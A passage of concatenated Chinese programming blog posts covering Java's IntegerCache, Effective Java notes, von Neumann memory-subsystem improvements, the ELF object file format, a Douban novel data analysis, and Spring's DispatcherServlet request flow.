 7      * During VM initialization, java.lang.Integer.IntegerCache.high property
 8      * may be set and saved in the private system properties in the
 9      * sun.misc.VM class.
10      */
11 
12     private static class IntegerCache {
13         static final int low = -128;
14         static final int high;
15         static final Integer cache[];
16 
17         static {
18             // high value may be configured by property
19             int h = 127;
20             String integerCacheHighPropValue =
21                 sun.misc.VM.getSavedProperty("java.lang.Integer.IntegerCache.high");
22             if (integerCacheHighPropValue != null) {
23                 try {
24                     int i = parseInt(integerCacheHighPropValue);
25                     i = Math.max(i, 127);
26                     // Maximum array size is Integer.MAX_VALUE
27                     h = Math.min(i, Integer.MAX_VALUE - (-low) -1);
28                 } catch( NumberFormatException nfe) {
29                     // If the property cannot be parsed into an int, ignore it.
30                 }
31             }
32             high = h;
33 
34             cache = new Integer[(high - low) + 1];
35             int j = low;
36             for(int k = 0; k < cache.length; k++)
37                 cache[k] = new Integer(j++);
38 
39             // range [-128, 127] must be interned (JLS7 5.1.7)
40             assert IntegerCache.high >= 127;
41         }
42 
43         private IntegerCache() {}
44     }

IntegerCache
 
第50条 如果其他类型更适合，则尽量避免使用字符串
　　* 字符串不适合代替其他的值类型。
　　* 字符串不适合代替枚举类型。
　　* 字符串不适合代替聚集类型（一个实体有多个组件）。
　　* 字符串也不适合代替能力表（capacityies；capacity：能力，一个不可伪造的键被称为能力）。　　
 
第51条 当心字符串连接的性能
　　* 构造一个较小的、大小固定的对象，使用连接操作符（+）是非常合适的，但不适合运用在大规模的场景中。
　　* 如果数量巨大，为了获得可以接受的性能，请使用StringBuilder（非同步），或StringBuffer（线程安全，性能较差，一般不需要用到）。
 
第52条 通过接口引用对象
　　* 这条应该与“面向接口编程”原则一致。
　　* 如果有合适的接口类型存在，则参数、返回值、变量和域，都应该使用接口来进行声明。
如声明一个类成员应当优先采用这种方法：

private Map<String, Object> map = new HashMap<>();

而不是：

private HashMap<String, Object> map = new HashMap<>();

　　* 如果没有合适的接口存在，则完全可以采用类而不是接口。
　　* 优先采用基类（往往是抽象类）。
 
第53条 接口优先于反射机制
　　* 反射的代价：
　　　　（1）丧失了编译时进行类型检查的好处。
　　　　（2）执行反射访问所需要的代码非常笨拙和冗长（编写乏味，可读性差）。
　　　　（3）性能差。
 　　* 当然，对于某些情况下使用反射是合理的甚至是必须的。
 
第54条 谨慎地使用本地方法
　　* 本地方法（native method）主要有三种用途：
　　　　（1）提供“访问特定于平台的机制”的能力，如访问注册表（registry）和文件锁（file lock）等。
　　　　（2）提供访问遗留代码库的能力，从而可以访问遗留数据（legacy data）。
　　　　（3）编写代码中注重性能的部分，提高系统性能（不值得提倡，JVM越来越快了）。
　　* 本地方法的缺点：
　　　　（1）不安全（C、C++等语言的不安全性）。
　　　　（2）本地语言与平台相关，可能存在不可移植性。
　　　　（3）造成调试困难。
　　　　（4）增加性能开销。在进入和退出本地代码时需要一定的开销。如果本地方法只是做少量的工作，那就有可能反而会降低性能（这点与Java8的并行流操作类似）。
　　　　（5）可能会牺牲可读性。
 
第55条 谨慎地进行优化
　　* 有三条与优化相关的格言是每个人都应该知道的：
　　　　（1）More computing sins are committed in the name of efficiency (without necessarily achieving it)than for any other single reason——including blind stupidity.
　　　　　　 —— William AWulf
　　　　（2）We should forget about small efficiencies, say about 97% of the time: premature optimization is the root of all evil.
　　　　　　—— Donald E. Knuth
　　　　（3）We follow two rules in the matter of optimization:
 　　　　　　Rule 1. Don't do it.	　　　　　　Rule 2(for experts only). Don't do it yet——that is, not until you have a perfectly clear and unoptimized solution.
　　　　　　—— M. J. Jackson
　　以上格言说明：优化的弊大于利，特别是不成熟的优化。
　　* 不要因为性能而牺牲合理的结构。要努力编写好的程序而不是快的程序。
　　　　实现上的问题可以通过后期优化，但遍布全局且限制性能的结构缺陷几乎是不可能被改正的。但并不是说在完成程序之前就可以忽略性能问题。
　　* 努力避免那些限制性能的设计决策，考虑API设计决策的性能后果。
 
第56条 遵守普遍接受的命名惯例
　　* 把标准的命名惯例当作一种内在的机制来看待。
 
本文地址：https://www.cnblogs.com/laishenghao/p/effective_java_note_general_programming.html 
 
********************************************************************************************************************************************************************************************************
冯诺依曼存储子系统的改进






<!--
 /* Font Definitions */
 @font-face
    {font-family:宋体;
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:黑体;
    panose-1:2 1 6 9 6 1 1 1 1 1;}
@font-face
    {font-family:"Cambria Math";
    panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
    {font-family:等线;
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:楷体;
    panose-1:2 1 6 9 6 1 1 1 1 1;}
@font-face
    {font-family:"\@黑体";
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:"\@等线";
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:"\@楷体";}
@font-face
    {font-family:"\@宋体";
    panose-1:2 1 6 0 3 1 1 1 1 1;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
    {margin:0cm;
    margin-bottom:.0001pt;
    text-align:justify;
    text-justify:inter-ideograph;
    font-size:10.5pt;
    font-family:等线;}
h2
    {mso-style-link:"Heading 2 Char";
    margin-right:0cm;
    margin-left:0cm;
    font-size:18.0pt;
    font-family:宋体;
    font-weight:bold;}
p.MsoHeader, li.MsoHeader, div.MsoHeader
    {mso-style-link:"Header Char";
    margin:0cm;
    margin-bottom:.0001pt;
    text-align:center;
    layout-grid-mode:char;
    border:none;
    padding:0cm;
    font-size:9.0pt;
    font-family:等线;}
p.MsoFooter, li.MsoFooter, div.MsoFooter
    {mso-style-link:"Footer Char";
    margin:0cm;
    margin-bottom:.0001pt;
    layout-grid-mode:char;
    font-size:9.0pt;
    font-family:等线;}
a:link, span.MsoHyperlink
    {color:blue;
    text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
    {color:#954F72;
    text-decoration:underline;}
p
    {margin-right:0cm;
    margin-left:0cm;
    font-size:12.0pt;
    font-family:宋体;}
p.MsoListParagraph, li.MsoListParagraph, div.MsoListParagraph
    {margin:0cm;
    margin-bottom:.0001pt;
    text-align:justify;
    text-justify:inter-ideograph;
    text-indent:21.0pt;
    font-size:10.5pt;
    font-family:等线;}
span.HeaderChar
    {mso-style-name:"Header Char";
    mso-style-link:Header;}
span.FooterChar
    {mso-style-name:"Footer Char";
    mso-style-link:Footer;}
span.Heading2Char
    {mso-style-name:"Heading 2 Char";
    mso-style-link:"Heading 2";
    font-family:宋体;
    font-weight:bold;}
span.mw-headline
    {mso-style-name:mw-headline;}
span.mw-editsection
    {mso-style-name:mw-editsection;}
span.mw-editsection-bracket
    {mso-style-name:mw-editsection-bracket;}
span.langwithname
    {mso-style-name:langwithname;}
.MsoChpDefault
    {font-family:等线;}
 /* Page Definitions */
 @page WordSection1
    {size:595.3pt 841.9pt;
    margin:72.0pt 90.0pt 72.0pt 90.0pt;
    layout-grid:15.6pt;}
div.WordSection1
    {page:WordSection1;}
 /* List Definitions */
 ol
    {margin-bottom:0cm;}
ul
    {margin-bottom:0cm;}
-->








冯诺依曼存储子系统的改进


       摘要 由于冯诺依曼体系结构存在串行性特点，成为了其发展的瓶颈，针对其串行性人们提出了若干改进和改变措施，涉及到CPU子系统、存储器子系统和IO子系统.本文讨论涉及到存储子系统

    关键词 冯诺依曼 串行 瓶颈 存储子系统 改进

冯·诺伊曼结构(Von Neumann architecture)是一种将程序指令存储器和数据存储器合并在一起的计算机设计概念结构.由于冯诺依曼体系结构存在串行性特点，成为了其发展的瓶颈.当今有许多计算机都采用冯诺依曼体系结构，所以对冯诺依曼体系进行改进的研究有很大的现实意义.

1  
存储子系统存在的问题

1．1存储器读取的串行性：

       冯诺依曼体系结构具有两个明显的特点，一是计算机以存储程序原理为基础，二是程序顺序执行.存储器是现代冯•诺依曼体系的核心，指令与数据混合存储，程序执行时， CPU 在程序计数器的指引下，线性顺序地读取下一条指令和数据.




Fig. 1.Memory of
Computer Model

所有对内存的读取都是独占性的，每一个瞬间，内存实体只能被一个操作对象通过片选信号占据.这就决定了内存的串行读取特性，对内存的操作无法并发进行.

 

1．2内存墙—存储器和CPU数据流量障碍:

    由于CPU速度远大于存储器读写速率[1]，据统计，处理器的性能以每年60%的速度提高，而存储器芯片的带宽每年却只提高10%，工艺水平的发展已使两者之间的带宽间隙越来越大.

 






Fig. 2.
Processor-memory
performance gap: starting in the 1980 performance, the microprocessor and
memory performance over the years

 

 

    处理器从存储器取一次数的同时，将可以执行数百至数千条指令，这就意味着CPU将会在数据输入或输出存储器时闲置.在CPU与存储器之间的流量（数据传输率）与存储器的容量相比起来相当小，在现代计算机中，流量与CPU的工作效率相比之下非常小，在某些情况下（当CPU需要在巨大的数据上运行一些简单指令时），数据流量就成了整体效率非常严重的限制.CPU将会在数据输入或输出存储器时闲置，无法充分发挥计算机的运算能力.因此内存预取是一个关键的瓶颈问题，也被称为“内存墙”（Memory Wall）

 

2存储子系统的改进

2. 1使用并行技术：

    改善的出路是使用并行技术，在指令运算处理及数据存储上都巧妙地运用并行技术.比如说多端口存储器，它具有多组独立的读写控制线路，可以对存储器进行并行的独立操作.又比如：存储器的访问不再用片选控制，而是可以任意地访问单元，在读写数据时用原子操作或事务处理的思想保证数据的一致性，这就取决于所采取的仲裁策略.哈佛体系则从另一个角度改善冯诺依曼存储器串行读写效率低下的瓶颈.哈佛结构是一种将指令储存和数据储存分开的存储器结构.指令储存和数据储存分开，数据和指令的储存可以同时进行，执行时可以预先读取下一条指令.







Fig. 3.
Harvard
architecture

 

2．2分层结构：

       现代高性能计算机系统要求存储器速度快、容量大，并且价格合理.现代计算机常把各种不同存储容量、存取速度、价格的存储器按照一定的体系结构形成多层结构，以解决存取速度、容量和价格之间的矛盾[2].这纾解了内存墙问题.

大多数现代计算机采用三级存储系统：cache+主存+辅存.这种结构主要由以下两个主要的部分组成：

1、 cache存储器系统：cache-主存层次.cache一般由少量快速昂贵的SRAM构成，用来加速大容量但速度慢的DRAM.

2、 虚拟存储器系统：主存-辅存层次









Fig. 4.Memory hierarchy

    多层存储体系结构设计想要达成一个目标，速度快、容量大、又便宜. 根据大量典型程序的运行情况的分析结果表明，在一个较短时间间隔内，程序对存储器访问往往集中在一个很小的地址空间范围内.这种对局部范围内存储器地址访问频繁，对范围以外的存储器地址较少访问的现象称为存储器访问的局部性.所以可以把近期使用的指令和数据尽可能的放在靠近CPU的上层存储器中，这样与CPU交互的数据程序就放在更快的存储器内，暂时不用的数据程序就放在下层存储器.CPU等待时间减少了，整机性能就提上来了.

    把下级存储器调过来的新的页放在本级存储器的什么地方，确定需要的数据、指令是否在本级，本级存储器满了以后先把哪些页给替换掉，在给上层存储器进行写操作的时候如何保证上下层存储器数据一致等映像、查找、替换、更新操作，这些操作需要合理、高效的算法策略才能保证这种多层结构的有效性.

3 智能存储器[3]

       一些研究者预测记忆行为将会优化计算系统的全局性能.他们建议将存储组件与处理核心融合在一个芯片，创造具有处理能力的存储器.这个策略包含intelligent RAM (IRAM)、Merged DRAM/Logic (MDL)
、Process in Memory (PIM) 等等.

    最早的智能存储器是C-RAM，一款由多伦多大学在1992年制造的PIM.这些处理元件通常集成在读出放大器的输出端，由单个控制单元控制，作为SIMD处理器.因为计算元件直接集成到
DRAM输出，这种设计策略可以大量提高DRAM的片上带宽.从结构上讲，这是一种简单的方法，理论上能够实现最高性能. 然而，这也有一些严重的缺点：虽然在结构上简单，但在实际设计和生产中出现了严重的复杂性，因为大多数DRAM核心都是高度优化的，并且很难修改， 这些类型的大规模并行SIMD设计在串行计算中很不成功; 

    传统的cache组织,解决的只是处理器的时间延迟问题,并不能用来解决处理器的存储带宽问题.PIM技术在DRAM芯片上集成了处理器,从而降低了存储延迟,增加了处理器与存储器之间的数据带宽.







Fig. 5.System Architecture
of PIM

基于PIM技术的体系结构的优点在于处理逻辑能以内部存储器带宽(100GB/s甚至更高)直接存取访问片上存储块，从而获取高性能;功耗方面，比与具有相同功能的传统处理器相低一个数量级

 

 

参考文献

[1]Carlos, Carvalho.
The Gap between Processor and Memory Speeds[J]. icca, 2010, (2): 27-34

[2]李广军，阎波等.微处理器系统结构与嵌入式系统设计.北京:电子工业出版社，2009

[3]师小丽.基于PIM技术的数据并行计算研究[D].西安理工大学,2009.

 







********************************************************************************************************************************************************************************************************
ELF文件格式
ELF文件（Executable Linkable Format）是一种文件存储格式。Linux下的目标文件和可执行文件都按照该格式进行存储，有必要做个总结。
概要
本文主要记录总结32位的Intel x86平台下的ELF文件结构。ELF文件以Section的形式进行存储。代码编译后的指令放在代码段（Code Section），全局变量和局部静态变量放到数据段（Data Section）。文件以一个“文件头”开始，记录了整个文件的属性信息。
未链接的目标文件结构
SimpleSection.c
int printf(const char* format, ...);

int global_init_var = 84;
int global_uniit_var;

void func1(int i)
{
        printf("%d\n", i);
}

int main(void)
{
        static int static_var = 85;
        static int static_var2;
        int a = 1;
        int b;
        func1(static_var + static_var2 + a + b);
        return a;
}
对于上面的一段c代码将其编译但是不链接。gcc -c -m32 SimpleSection.c（ -c表示只编译不链接，-m32表示生成32位的汇编）得到SimpleSection.o。可以用objdump或readelf命令查看目标文件的结构和内容。
ELF文件头
可以用readelf -h查看文件头信息。执行readelf -h SimpleSection.o后：
root@DESKTOP-2A432QS:~/c# readelf -h SimpleSection.o 
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              REL (Relocatable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x0
  Start of program headers:          0 (bytes into file)
  Start of section headers:          832 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           0 (bytes)
  Number of program headers:         0
  Size of section headers:           40 (bytes)
  Number of section headers:         13
  Section header string table index: 10
程序头包含了很多重要的信息，每个字段的含义可参考ELF结构文档。主要看下：

Entry point address：程序的入口地址，这是没有链接的目标文件所以值是0x00
Start of section headers：段表开始位置的首字节
Size of section headers：段表的长度（字节为单位）
Number of section headers：段表中项数，也就是有多少段
Start of program headers：程序头的其实位置（对于可执行文件重要，现在为0）
Size of program headers：程序头大小（对于可执行文件重要，现在为0）
Number of program headers：程序头中的项数，也就是多少Segment（和Section有区别，后面介绍）
Size of this header：当前ELF文件头的大小，这里是52字节

段表及段（Section）
段表
ELF文件由各种各样的段组成，段表就是保存各个段信息的结构，以数组形式存放。段表的起始位置，长度，项数分别由ELF文件头中的Start of section headers，Size of section headers，Number of section headers指出。使用readelf -S SimpleSection.o查看SimpleSection.o的段表如下：
There are 13 section headers, starting at offset 0x340:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .text             PROGBITS        00000000 000034 000062 00  AX  0   0  1
  [ 2] .rel.text         REL             00000000 0002a8 000028 08   I 11   1  4
  [ 3] .data             PROGBITS        00000000 000098 000008 00  WA  0   0  4
  [ 4] .bss              NOBITS          00000000 0000a0 000004 00  WA  0   0  4
  [ 5] .rodata           PROGBITS        00000000 0000a0 000004 00   A  0   0  1
  [ 6] .comment          PROGBITS        00000000 0000a4 000036 01  MS  0   0  1
  [ 7] .note.GNU-stack   PROGBITS        00000000 0000da 000000 00      0   0  1
  [ 8] .eh_frame         PROGBITS        00000000 0000dc 000064 00   A  0   0  4
  [ 9] .rel.eh_frame     REL             00000000 0002d0 000010 08   I 11   8  4
  [10] .shstrtab         STRTAB          00000000 0002e0 00005f 00      0   0  1
  [11] .symtab           SYMTAB          00000000 000140 000100 10     12  11  4
  [12] .strtab           STRTAB          00000000 000240 000065 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
总共有13个Section，重点关注.text, .data, .rodata, .symtab, .rel.text段。
代码段
.text段保存代码编译后的指令，可以用objdump -s -d SimpleSection.o查看SimpleSection.o代码段的内容。
SimpleSection.o:     file format elf32-i386

Contents of section .text:
 0000 5589e583 ec0883ec 08ff7508 68000000  U.........u.h...
 0010 00e8fcff ffff83c4 1090c9c3 8d4c2404  .............L$.
 0020 83e4f0ff 71fc5589 e55183ec 14c745f0  ....q.U..Q....E.
 0030 01000000 8b150400 0000a100 00000001  ................
 0040 c28b45f0 01c28b45 f401d083 ec0c50e8  ..E....E......P.
 0050 fcffffff 83c4108b 45f08b4d fcc98d61  ........E..M...a
 0060 fcc3                                 ..              
...省略          

Disassembly of section .text:

00000000 <func1>:
   0:   55                      push   %ebp
   1:   89 e5                   mov    %esp,%ebp
   3:   83 ec 08                sub    $0x8,%esp
   6:   83 ec 08                sub    $0x8,%esp
   9:   ff 75 08                pushl  0x8(%ebp)
   c:   68 00 00 00 00          push   $0x0
  11:   e8 fc ff ff ff          call   12 <func1+0x12>
  16:   83 c4 10                add    $0x10,%esp
  19:   90                      nop
  1a:   c9                      leave  
  1b:   c3                      ret    

0000001c <main>:
  1c:   8d 4c 24 04             lea    0x4(%esp),%ecx
  20:   83 e4 f0                and    $0xfffffff0,%esp
  23:   ff 71 fc                pushl  -0x4(%ecx)
  26:   55                      push   %ebp
  27:   89 e5                   mov    %esp,%ebp
  29:   51                      push   %ecx
  2a:   83 ec 14                sub    $0x14,%esp
  2d:   c7 45 f0 01 00 00 00    movl   $0x1,-0x10(%ebp)
  34:   8b 15 04 00 00 00       mov    0x4,%edx
  3a:   a1 00 00 00 00          mov    0x0,%eax
  3f:   01 c2                   add    %eax,%edx
  41:   8b 45 f0                mov    -0x10(%ebp),%eax
  44:   01 c2                   add    %eax,%edx
  46:   8b 45 f4                mov    -0xc(%ebp),%eax
  49:   01 d0                   add    %edx,%eax
  4b:   83 ec 0c                sub    $0xc,%esp
  4e:   50                      push   %eax
  4f:   e8 fc ff ff ff          call   50 <main+0x34>
  54:   83 c4 10                add    $0x10,%esp
  57:   8b 45 f0                mov    -0x10(%ebp),%eax
  5a:   8b 4d fc                mov    -0x4(%ebp),%ecx
  5d:   c9                      leave  
  5e:   8d 61 fc                lea    -0x4(%ecx),%esp
  61:   c3                      ret
可以看到.text段里保存的正是func1()和main()的指令。
数据段和只读数据段
.data段保存的是已经初始化了的全局静态变量和局部静态变量。前面SimpleSection.c中的global_init_varabal和static_var正是这样的变量。使用objdump -x -s -d SimpleSection.o查看：
Contents of section .data:
 0000 54000000 55000000                    T...U...        
Contents of section .rodata:
 0000 25640a00                             %d..            
最左边的0000是偏移，不用看，后面跟着的0x00000054和0x00000055正是global_init_varabal和static_var的初始值。
.rodata段存放的是只读数据，包括只读变量（const修饰的变量和字符串常量），这个例子中保存了"%d\n"正是调用printf的时候使用的字符常量。
符号表段
符号表段一般叫做.symtab，以数组结构保存符号信息（函数和变量），对于函数和变量符号值就是它们的地址。主要关注两类符号：

定义在目标文件中的全局符号，可以被其他目标文件引用，比如SimpleSction.o里面的func1, main和global_init_var。
在本目标文件中引用的全局符号，却没有定义在本目标文件，比如pritnf。

可以用readelf -s SimpleSection.o查看SimpleSection.o的符号：
Symbol table '.symtab' contains 16 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS SimpleSection.c
     2: 00000000     0 SECTION LOCAL  DEFAULT    1 
     3: 00000000     0 SECTION LOCAL  DEFAULT    3 
     4: 00000000     0 SECTION LOCAL  DEFAULT    4 
     5: 00000000     0 SECTION LOCAL  DEFAULT    5 
     6: 00000004     4 OBJECT  LOCAL  DEFAULT    3 static_var.1488
     7: 00000000     4 OBJECT  LOCAL  DEFAULT    4 static_var2.1489
     8: 00000000     0 SECTION LOCAL  DEFAULT    7 
     9: 00000000     0 SECTION LOCAL  DEFAULT    8 
    10: 00000000     0 SECTION LOCAL  DEFAULT    6 
    11: 00000000     4 OBJECT  GLOBAL DEFAULT    3 global_init_var
    12: 00000004     4 OBJECT  GLOBAL DEFAULT  COM global_uniit_var
    13: 00000000    28 FUNC    GLOBAL DEFAULT    1 func1
    14: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND printf
    15: 0000001c    70 FUNC    GLOBAL DEFAULT    1 main
可以看到：

func1和main的Ndx对应的值是1，表示在.text段（.text段在段表中的索引是1），类型是FUNC，value分别是0x00000000和0x0000001c，表明这两个函数指令字节码的首字节分别在.text段的0x00000000和0x0000001c偏移处。
printf的Ndx是UND，表明这个符号没有在SimpleSection.o中定义，仅仅是被引用。
global_init_var和static_var.1488两个符号的Ndx都是3，说明他们被定义在数据段，value分别是0x00000000和0x00000004，表示这个符号的位置在数据段的0x00000000和0x00000004偏移处，翻看上一节

Contents of section .data:
 0000 54000000 55000000                    T...U... 
数据段0x00000000和0x00000004偏移处保存的正是global_init_var和static_var这两个变量。
重定位表段
重定位表也是一个段，用于描述在重定位时链接器如何修改相应段里的内容。对于.text段，对应的重定位表是.rel.text表。使用objdump -r SimpleSection.o查看重定位表。
SimpleSection.o:     file format elf32-i386

RELOCATION RECORDS FOR [.text]:
OFFSET   TYPE              VALUE 
0000000d R_386_32          .rodata
00000012 R_386_PC32        printf
00000036 R_386_32          .data
0000003b R_386_32          .bss
00000050 R_386_PC32        func1
printf对应的那行的OFFSET为0x00000012，表明.text段的0x00000012偏移处需要修改。我们objdump -s -d SimpleSection.o查看代码段的0x00000012偏移，发现是”fc ff ff ff“是call指令的操作数。
00000000 <func1>:
   0:   55                      push   %ebp
   1:   89 e5                   mov    %esp,%ebp
   3:   83 ec 08                sub    $0x8,%esp
   6:   83 ec 08                sub    $0x8,%esp
   9:   ff 75 08                pushl  0x8(%ebp)
   c:   68 00 00 00 00          push   $0x0
  11:   e8 fc ff ff ff          call   12 <func1+0x12>
  16:   83 c4 10                add    $0x10,%esp
  19:   90                      nop
  1a:   c9                      leave  
  1b:   c3                      ret 
也就是说，在没有重定位前call指令的操作”fc ff ff ff“是无效的，需要在重定位过程中进行修正。func1那行也同理。
总结
ELF文件结构可以用下面的图表示：
可执行程序结构
和未链接的ELF文件结构一样，只不过引入了Segment的概念（注意和Section进行区分）。Segment本质上是从装载的角度重新划分了ELF的各个段。目标文件链接成可执行文件时，链接器会尽可能把相同权限属性的段（Section）分配到同一Segment。Segment结构的起始位置，项数，大小分别由ELF头中的Size of program headers，Number of program headers， Size of this header字段指定。
参考资料：

《程序员的自我修养》第3，6章
ELF结构文档


********************************************************************************************************************************************************************************************************
数据分析实战之豆瓣小说知多少？
    最近学习了python爬虫，于是，小试身手。
    得到豆瓣上图书标签为“小说”（https://book.douban.com/tag/小说 ）的图书信息，简单整理后，得到998条记录，包含书名、作者、作者国籍、译者、出版社、出版时间、价格、评分、评价人数9个字段。下面就让我们来看看小说的世界。

小说越火，水准越高？

    评价人数不等于实际阅读人数，但也可以从其中看出一本书的火爆程度。若以评价人数超过10万、评分超过8.4的书定义为高质量的热门小说，那998本小说中有14本这样的小说。
    其中，《追风筝的人》的评价人数遥遥领先（34万），无疑是最火的小说，其评分8.9。《解忧杂货铺》紧随其后（31万），评分8.6。两者的评价人数狂甩第三名《白夜行》8万，但评分略微落后于《白夜行》的9.1。
    从前三名来看，追求大多数人在看的小说不会错。但也要小心，《挪威的森林》评价人数20万，评分8；《梦里花落知多少》评价人数15万，评分7.1。
 
图1：书的评分和评价人数（评分的平均值和中位数均为8.4）

越来越贵的小说

    小说是越来越贵了。尽管同年出版的小说的价格波动幅度较大，但总体而言，小说价格逐步上升。1998年之前，每年出版的小说数量较少，大部分小说的价格10元之下，1991年出版的《jin瓶梅》以268元一枝独秀。在1998年之后，每年出版的小说均价从18.9元上升至71.5元。
    另外，小说的价格率创新高。2008年的《大秦帝国》高达369元，2013年《太平广记（全十册）》创新高（398元），仅在3年后，这一价格再次被刷新，《契诃夫小说全集》达到了630元。
 
图2：书在不同出版年份的平均价格

忙碌的小说生产者

生产者之一：作者
    998条记录中共有640个作者，但从平均数来看，平均一个作者出版1.6本小说，但实际上，仅有167个作者的出书数量超过了2。并且，只有16个作者的出书数量超过了5。
 
图3：不同作者的出书数量
    在16个出书数量超过5的作者中，村上春树以14本小说位居榜首，然而令我吃惊的是，其评分在8.4以上的作品只有1本。要知道，仅以一本之差位居第二的加西亚·马尔克斯，有9本小说的评分在8.4以上。
    似乎日本作家都有这种产量颇高，但是质量有待提升的状况，且作品越多，高评分作品的占比越小。三岛由纪夫：8个作品中5个作品评分在8.4以上；东野圭吾：9个作品中3个作品评分在8.4以上；伊坂幸太郎：11个作品中3个作品评分在8.4以上。
    国内作家中，余华、张爱玲各有7个作品，且各有4本评分在8.4之上。但同有7个作品的亦舒，评分在8.4以上的仅有1本（早期作品《流金岁月》）。此外，金庸、鲁迅、刘慈欣各有6个作品，且评分均在8.4之上。
 
图4：前16个高产作者的出书数量、评分情况
生产者之二：出版社
    998条记录中共有160个出版社，但从平均数来看，平均一个出版社出版6.2本小说，但实际上，仅有27个出版社的出书数量超过了6。并且，只有10个出版社的出书数量超过了20。
 
图5：不同出版社的出书数量
    在出书数量超过了20的10个出版社中，人民文学出版社（118）、上海译文出版社（116）占据第一梯队，遥遥领先。译林出版社（73）、南海出版社（72）位于第二梯队，两个出版社不相上下。
    这10个出版社均会涉及不同国家作者的书，但不同出版社的主攻方向有略微差别。人民文学出版社、上海文艺出版社比较全能，涉猎的国家较多。上海译文出版社主攻外国文学，尤其是英国、日本和美国。译林出版社、重庆出版社集中于美国，南海出版公司集中于于日本，上海人民出版社则集中于英国。
 
图6：不同出版社的出书数量、涉及的国家
********************************************************************************************************************************************************************************************************
SpringCloud请求响应数据转换（二）
上篇文章记录了从后端接口返回数据经过切面和消息转换器处理后返回给前端的过程。接下来，记录从请求发出后到后端接口调用过的过程。
web请求处理流程

源码分析
 ApplicationFilterChain会调DispatcherServlet类的doService()（HttpServlet类），类继承关系如下：

最终会调DispatcherServlet类的doDispatch方法，并由该方法控制web请求的全过程，包括确定请求方法、确定请求处理适配器和请求实际调用和数据处理，代码如下：

 1 /**
 2      * Process the actual dispatching to the handler.
 3      * <p>The handler will be obtained by applying the servlet's HandlerMappings in order.  按序遍历并确定HadlerMapping
 4      * The HandlerAdapter will be obtained by querying the servlet's installed HandlerAdapters 
 5      * to find the first that supports the handler class.  找到第一个支持处理类的HandlerAdapters
 6      * <p>All HTTP methods are handled by this method. It's up to HandlerAdapters or handlers
 7      * themselves to decide which methods are acceptable.  所有HTTP请求都由该方法处理，然后由具体的HandlerAdapter和处理类确定调用方法
 8      * @param request current HTTP request
 9      * @param response current HTTP response
10      * @throws Exception in case of any kind of processing failure
11      */
12     protected void doDispatch(HttpServletRequest request, HttpServletResponse response) throws Exception {
13         HttpServletRequest processedRequest = request;
14         HandlerExecutionChain mappedHandler = null;
15         boolean multipartRequestParsed = false;
16 
17         WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);
18 
19         try {
20             ModelAndView mv = null;
21             Exception dispatchException = null;
22 
23             try {
24                 processedRequest = checkMultipart(request);
25                 multipartRequestParsed = (processedRequest != request);
26                  //1、获取HandlerMethod
27                 // Determine handler for the current request.
28                 mappedHandler = getHandler(processedRequest);
29                 if (mappedHandler == null || mappedHandler.getHandler() == null) {
30                     noHandlerFound(processedRequest, response);
31                     return;
32                 }
33                  //2、确定适配器
34                 // Determine handler adapter for the current request.
35                 HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());
36 
37                 // Process last-modified header, if supported by the handler.判断是否支持If-Modified-Since
38                 String method = request.getMethod();
39                 boolean isGet = "GET".equals(method);
40                 if (isGet || "HEAD".equals(method)) {
41                     long lastModified = ha.getLastModified(request, mappedHandler.getHandler());
42                     if (logger.isDebugEnabled()) {
43                         logger.debug("Last-Modified value for [" + getRequestUri(request) + "] is: " + lastModified);
44                     }
45                     if (new ServletWebRequest(request, response).checkNotModified(lastModified) && isGet) {
46                         return;
47                     }
48                 }
49 
50                 if (!mappedHandler.applyPreHandle(processedRequest, response)) {
51                     return;
52                 }
53                  //3、请求实际处理，包括请求参数的处理、后台接口的调用和返回数据的处理
54                 // Actually invoke the handler.
55                 mv = ha.handle(processedRequest, response, mappedHandler.getHandler());
56 
57                 if (asyncManager.isConcurrentHandlingStarted()) {
58                     return;
59                 }
60 
61                 applyDefaultViewName(processedRequest, mv);
62                 mappedHandler.applyPostHandle(processedRequest, response, mv);
63             }
64             catch (Exception ex) {
65                 dispatchException = ex;
66             }
67             catch (Throwable err) {
68                 // As of 4.3, we're processing Errors thrown from handler methods as well,
69                 // making them available for @ExceptionHandler methods and other scenarios.
70                 dispatchException = new NestedServletException("Handler dispatch failed", err);
71             }
72             processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);
73         }
74         catch (Exception ex) {
75             triggerAfterCompletion(processedRequest, response, mappedHandler, ex);
76         }
77         catch (Throwable err) {
78             triggerAfterCompletion(processedRequest, response, mappedHandler,
79                     new NestedServletException("Handler processing failed", err));
80         }
81         finally {
82             if (asyncManager.isConcurrentHandlingStarted()) {
83                 // Instead of postHandle and afterCompletion
84                 if (mappedHandler != null) {
85                     mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);
86                 }
87             }
88             else {
89                 // Clean up any resources used by a multipart request.
90                 if (multipartRequestParsed) {
91                     cleanupMultipart(processedRequest);
92                 }
93             }
94         }
95     }

 1、获取HandlerMethod
首先是DispatcherServlet的 getHandler方法，获取处理器链，所有处理器（HandlerMapping）都注册在handlerMappings中，如下图所示。

 1 /**
 2      * Return the HandlerExecutionChain for this request.返回处理器链，处理该请求
